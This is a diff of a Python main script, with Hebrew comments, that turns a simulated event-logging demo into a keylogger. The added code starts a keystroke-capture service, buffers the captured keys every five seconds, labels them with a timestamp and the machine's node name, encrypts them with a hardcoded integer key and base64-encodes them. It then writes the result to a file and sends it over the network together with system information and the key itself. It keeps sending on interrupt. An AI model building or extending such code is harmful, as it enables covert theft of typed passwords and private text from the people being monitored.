@@ -1,35 +1,55 @@
 import time
-from logger import EventLogger
-from writer import EncryptedJSONWriter
-from sender import FileSender
+import socket
+from logger import KeyLoggerService
+from writer import FileWriter
+from sender import NetworkWriter
+from encryption import Encryptor
+import base64
+from systeminfo import get_system_info
 
 def main():
-    logger = EventLogger()
-    writer = EncryptedJSONWriter()
-    sender = FileSender()
+    service = KeyLoggerService()
+    writer = FileWriter()
+    sender = NetworkWriter()
+    encryption_key = 42                # פה מכניסים את מילת ההצפנה
+    encryptor = Encryptor(encryption_key)
+    Systeminfo = get_system_info()
+    buffer = []
 
-    print("📡 התחלת איסוף אירועים...")
+    service.start_logging()      # מתחיל בהאזנה
 
-    while True:
-        # סימולציה של איסוף אירועים
-        logger.add_event("משתמש לחץ על כפתור")
-        logger.add_event("התקבלה בקשה מהדפדפן")
 
-        # קבלת האירועים שנאספו
-        events = logger.get_events()
-        if events:
-            # שמירה ל־JSON מוצפן
-            writer.save_events(events)
-            print(f"✅ נשמרו {len(events)} אירועים לקובץ מוצפן.")
+    try:
+        while True:
+            time.sleep(5)   # כאן מוגדר כל כמה שניות שומר הקשות ושלוח
+            keys = service.get_logged_keys()
+            print(keys)
+            if keys:
+                buffer.extend(keys)
 
-            # שליחת הקובץ לשרת Flask
-            sender.send_file("events.json.enc")
+            if buffer:
+                data = ''.join(buffer)
+                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+                data = f"[{timestamp}] \n [{Systeminfo["node_name"]}] \n{data}"
+                encrypted_bytes = encryptor.encrypt(data)                          # Encrypt using your Encryptor
+                encrypted_b64 = base64.b64encode(encrypted_bytes).decode("utf-8")  # Base64 encode before sending
 
-            # ניקוי האירועים מהזיכרון
-            logger.clear_events()
 
-        # המתנה לפני הסיבוב הבא
-        time.sleep(10)  # כל 10 שניות
+                writer.write_data(encrypted_b64)
+                sender.send_data(encrypted_b64,Systeminfo,encryption_key)
+
+                buffer = []
+
+    except KeyboardInterrupt:
+        if buffer:
+            data = ''.join(buffer)
+            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+            data = f"[{timestamp}] \n  [{Systeminfo["node_name"]}] \n{data}"
+            encrypted_bytes = encryptor.encrypt(data)                          # Encrypt using your Encryptor
+            encrypted_b64 = base64.b64encode(encrypted_bytes).decode("utf-8")  # Base64 encode before sending
+
+            writer.write_data(encrypted_b64)
+            sender.send_data(encrypted_b64, Systeminfo, encryption_key)
 
 if __name__ == "__main__":
     main()
